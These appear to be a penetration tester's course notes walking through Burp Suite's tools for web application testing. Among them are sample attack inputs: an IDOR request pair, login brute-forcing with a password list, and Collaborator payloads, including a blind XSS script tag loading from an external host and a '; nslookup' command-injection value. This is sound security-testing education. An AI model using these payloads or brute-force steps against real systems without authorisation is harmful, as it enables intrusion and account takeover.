---
title: "Burp Suite"
order: 4
source: "https://github.com/Javierlozo/tcm-pwpa-notes/blob/main/01-recon/burp-suite.md"
---

# Burp Suite

Once I know what subdomains are alive and roughly what stack they run, I point my browser at the interesting ones through Burp. Burp sits in the middle as a proxy. Every request the browser sends and every response the server returns flows through it, so I can see, modify, replay, and fuzz traffic before it hits either side.

The free Community edition is enough for most of the recon stage. The paid Pro version adds the active scanner and a faster Intruder.

## Proxy tab

The proxy is the front door. I set my browser to send traffic through `127.0.0.1:8080` (easiest with Burp's built-in Chromium or the FoxyProxy extension) and now every request flows through Burp.

### Intercept

Intercept is a pause button on traffic. When it's on, Burp holds each outgoing request until I click `Forward` or `Drop`. While it's held I can edit the headers, body, method, or URL before sending it on. Useful when I want to tweak one specific request without setting up a Repeater tab, or when I need to catch a request that only fires once (like a registration flow or a one-time token).

For passive browsing I usually leave Intercept **off**, otherwise every image and JS file pauses the whole page.

### HTTP history

Even with Intercept off, Burp records everything that went through it under `Proxy → HTTP history`. This is where I find requests after the fact. Right-click any entry to send it to Repeater, Intruder, or Comparer.

## Site map (Target tab)

The Target tab builds a tree of every host and URL Burp has seen. Browse the app normally for a few minutes and the site map fills in on its own: each path, query string, parameter, and response code shows up under the matching host.

What I actually use it for:

- Scoping. Right-click the target host and `Add to scope` so Burp only logs what I care about and the rest of the noise (Google, analytics, CDNs) gets filtered.
- Finding hidden endpoints. Sometimes JS files reference API paths I didn't click on. They still end up here.
- Spotting parameters worth fuzzing. The column view shows status code, length, MIME type at a glance.

The screenshot below shows what a typical site map looks like after a few minutes of browsing — hosts down the left, requests in the middle, request/response on the bottom.

## Repeater

Repeater is where I take a single request and replay it as many times as I want with whatever tweaks I want. Send any request from HTTP history with `Ctrl+R` and it lands here. Edit the request on the left, click `Send`, see the response on the right. Repeat.

This is my main tool for **manual testing** of one parameter at a time. Change a value, send, look at the response, change it again. No automation, just me poking.

### IDOR (Insecure Direct Object Reference)

A really common bug I find with Repeater. IDOR is when the app exposes an object identifier (a user ID, order number, document ID) directly in the request and uses it to look up data **without checking that the logged-in user is actually allowed to see that object**.

Classic example: I log in as user `123` and visit my profile.

```
GET /api/user/123/profile HTTP/1.1
Host: target.com
Cookie: session=abc...
```

The server returns my profile. Fine. But what happens if I send the request to Repeater and change `123` to `124`?

```
GET /api/user/124/profile HTTP/1.1
Host: target.com
Cookie: session=abc...
```

If the server returns user 124's data, that's IDOR. The app trusted the ID in the URL instead of checking "is the session that owns user 123 allowed to read user 124?".

The same pattern works on `POST` and `PUT` requests where an object ID is in the body or a hidden form field. I look for any numeric or guessable ID (sequential integers, short UUIDs, base64 of an integer) and try incrementing, decrementing, or swapping it in Repeater while keeping my own session cookie.

Why Repeater is right for this: each test is a deliberate, single-shot change. I don't want to spray hundreds of IDs at the server until I confirm the bug exists with one or two tries.

## Intruder

When the test stops being "send this one request" and becomes "send this request a thousand times with different values in slot X", I move to Intruder.

Workflow:

1. Send the request to Intruder (`Ctrl+I` from HTTP history or Repeater).
2. Go to the `Positions` tab. Highlight the value you want to vary and click `Add §`. The `§` markers tell Intruder where to insert payloads.
3. Pick an attack type (more on these below).
4. On the `Payloads` tab, load the wordlist or set the payload generator.
5. Click `Start attack`.

The results window shows every request, its status code, length, and any matches against patterns I configured. Anomalies (a different length, a 200 where everything else is 401, an unusual response time) are what I'm hunting for.

### The four attack types

Burp gives four ways to wire payloads into the `§` positions. Picking the right one matters because the wrong choice can mean millions of unnecessary requests.

- **Sniper.** One payload set, one position at a time. If I marked three positions and loaded 100 payloads, Sniper sends 300 requests: 100 with the payload in position 1, 100 in position 2, 100 in position 3. Default for fuzzing a single parameter.

- **Battering ram.** One payload set, but it puts the **same payload in every position at the same time**. 100 payloads, 3 positions = 100 requests, with each request using the same value in all three slots. Useful when the same value needs to appear in multiple places (e.g., a username in both a header and a body field).

- **Pitchfork.** Multiple payload sets, one per position, iterated in parallel. Position 1 gets payload set A, position 2 gets payload set B. They advance together: request 1 uses A[0] and B[0], request 2 uses A[1] and B[1], and so on. Sends `min(len A, len B)` requests. The classic use case is credential stuffing with a paired username/password list.

- **Cluster bomb.** Multiple payload sets, every combination. Position 1 × position 2 = full Cartesian product. 100 usernames and 100 passwords = 10,000 requests. This is your full brute force when you don't have pairs, just two lists you want to combine every which way.

### Brute force (login forms)

The everyday use of Intruder is brute-forcing a login. Catch the login POST in the proxy, send to Intruder, mark the password field as a position, load a password wordlist (`rockyou.txt` shortened, or a small known-passwords list), pick Sniper, and let it rip. Sort by response length: the one wrong-length response is usually the successful login.

Caveats: Community edition throttles Intruder hard. For anything serious I switch to Turbo Intruder (next section) or do it once to confirm the bug and stop.

## Extensions: BApp Store and Turbo Intruder

The `Extensions` tab has a built-in marketplace called the **BApp Store**. A lot of the most useful Burp tooling is community extensions.

- **Turbo Intruder.** Same idea as Intruder, but it's a Python-scripted request engine that can blast tens of thousands of requests per second. I use it when Burp Pro's regular Intruder still isn't fast enough, or when I need a more complex attack (race conditions, conditional follow-ups). Written as a small Python script you paste into the tab.
- **Logger++**. More powerful logging than the built-in. Lets me filter and search across every request Burp has ever seen in the session.
- **Autorize.** Repeats every request with a second user's session cookie, side by side with the original. Brilliant for spotting authz bugs (IDOR, missing role checks) at scale instead of one-by-one in Repeater.
- **Param Miner.** Finds hidden parameters and headers the app actually reads but doesn't document.
- **JWT Editor.** Decode, edit, and re-sign JWTs without leaving Burp.

I install extensions from `Extensions → BApp Store → Install`. They show up as new tabs or as right-click options on requests.

## Collaborator

Collaborator is Burp's out-of-band server. It gives me a unique subdomain (something like `r9xz1...oastify.com`) that logs any DNS lookup or HTTP request hitting it. I drop that subdomain into a payload, and if the target's server ever resolves or visits it, Collaborator catches it.

What it's actually for: bugs that don't show in the immediate HTTP response. The most common cases:

- **Blind SSRF.** I inject `http://abc123.oastify.com/` into a parameter. If the server fetches it server-side (even if I never see the response in my browser), Collaborator logs the request and I know there's an SSRF.
- **Blind XSS.** A payload like `<script src="//abc123.oastify.com/x.js"></script>` stored somewhere that fires later in an admin panel. When an admin's browser eventually loads the page, Collaborator gets the hit.
- **Blind command injection / DNS exfiltration.** `; nslookup abc123.oastify.com` and similar. If I see the DNS query in Collaborator, the command ran.

The principle is "no echo, still proof." Even when the vulnerable endpoint returns nothing useful, Collaborator gives me a confirmed signal that my payload reached server-side execution.

## Decoder

A small utility tab for encoding and decoding strings. I paste in a value (base64, URL-encoded, hex, gzip-compressed) and chain decoders/encoders to unwrap it.

I use it all the time for:

- Decoding base64 cookies and tokens to see what's inside.
- URL-decoding query strings to read them cleanly.
- Building encoded payloads (e.g., URL-encoding a SQLi or XSS payload so it survives the request unchanged).
- Inspecting JWT segments (though JWT Editor extension is faster).

Nothing fancy. Just a fast inline encode/decode without leaving Burp.

## Comparer

Comparer takes two responses and shows a side-by-side diff: word-level or byte-level. I send two requests to Comparer from HTTP history, click `Compare`, and the differences are highlighted.

Where this earns its keep:

- **Authz testing.** Send the same request twice, once as user A and once as user B. If the responses are identical, the app isn't isolating users. If they're different but neither one is `403`, I have a finding.
- **Blind SQLi.** Send `... AND 1=1` and `... AND 1=2` versions. A subtle difference in response length or content confirms the injection is being interpreted server-side.
- **Username enumeration.** Login response for a known-valid user vs. a known-invalid one. Any difference (different error message, different status, even a one-byte length difference) is a leak.

It's the eyeball-tier of differential testing: easy and visual, and often the fastest way to confirm "is the server treating these two inputs differently?"

## Logger

Logger (the built-in `Logger` tab, separate from Logger++ extension) is a chronological feed of every HTTP request Burp processed, across **all tools**: proxy, Repeater, Intruder, scanner, extensions. HTTP history only shows proxy traffic; Logger shows everything.

What I use it for:

- Going back through an Intruder run after the fact to inspect one specific request/response pair.
- Confirming that an extension actually fired the requests I expected.
- Filtering by host, method, status, or body content to find a needle in the session's haystack.

Filters are configurable at the top, and I can right-click any logged entry to send it to Repeater or Intruder. Basically my session-wide search.

## My order at the recon stage

1. Set browser to proxy through Burp, browse the target normally for a few minutes.
2. Watch the Site map fill in. Add target host to scope.
3. Anything interesting (login, ID in URL, API endpoint) goes to Repeater for manual poking.
4. If I find a parameter worth fuzzing, send to Intruder, pick Sniper, load wordlist.
5. Out-of-band suspects (SSRF, blind XSS, blind cmd inj) get a Collaborator payload.
6. Decoder, Comparer, Logger as needed during the above.
